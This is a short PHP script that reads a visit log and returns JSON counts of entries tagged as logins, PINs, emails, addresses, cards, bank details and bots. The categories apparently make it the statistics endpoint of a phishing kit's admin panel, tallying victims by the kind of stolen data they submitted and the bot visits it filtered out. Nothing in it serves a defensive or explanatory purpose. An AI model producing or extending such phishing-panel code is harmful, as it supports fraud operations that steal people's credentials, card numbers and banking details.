<?php
$visitorlogs = __DIR__ . '/../core/visit_log.jsonl';

$summaryCounts = [
    'VISIT' => 0,
    'LOGIN' => 0,
    'PIN' => 0,
    'EMAIL' => 0,
    'ADDRESS' => 0,
    'CARD' => 0,
    'BANK' => 0,
    'BOT' => 0,
];

if (file_exists($visitorlogs)) {
    $lines = file($visitorlogs, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        $entry = json_decode($line, true);
        if ($entry && isset($entry['INFO'])) {
            $infoRaw = strtoupper(trim($entry['INFO']));

            if (strpos($infoRaw, 'EMAIL') !== false) {
                $summaryCounts['EMAIL']++;
            } elseif (strpos($infoRaw, 'CARD') !== false) {
                $summaryCounts['CARD']++;
            } elseif (strpos($infoRaw, 'LOGIN') !== false) {
                $summaryCounts['LOGIN']++;
            } elseif (strpos($infoRaw, 'PIN') !== false) {
                $summaryCounts['PIN']++;
            } elseif (strpos($infoRaw, 'ADDRESS') !== false) {
                $summaryCounts['ADDRESS']++;
            } elseif (strpos($infoRaw, 'BANK') !== false) {
                $summaryCounts['BANK']++;
            } elseif ($infoRaw === 'VISIT') {
                $summaryCounts['VISIT']++;
            } elseif ($infoRaw === 'BOT' || strpos($infoRaw, 'WRONG') !== false) {
                $summaryCounts['BOT']++;
            }
        }
    }
}

header('Content-Type: application/json');
echo json_encode($summaryCounts);
